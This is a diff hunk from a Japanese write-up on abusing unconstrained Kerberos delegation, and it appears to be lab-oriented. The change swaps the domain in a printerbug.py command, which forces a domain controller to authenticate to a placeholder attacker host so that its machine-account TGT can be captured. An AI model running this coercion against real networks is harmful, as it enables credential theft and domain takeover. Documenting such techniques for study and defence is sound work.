@@ -30,7 +30,7 @@ summary: 制約なし委任が有効なホストに溜まる TGT を使って、
 
 ```
 # DC の認証を強制（プリンタスプーラの強制認証を利用する例）
-printerbug.py corp.local/user:'Password123'@<DC_IP> <attacker_host>
+printerbug.py lab.local/user:'Password123'@<DC_IP> <attacker_host>
 ```
 
 DC がレスポンスのために監視対象ホストへアクセスしてきたタイミングで、DC のマシンアカウント TGT が監視中のツールに捕捉される。
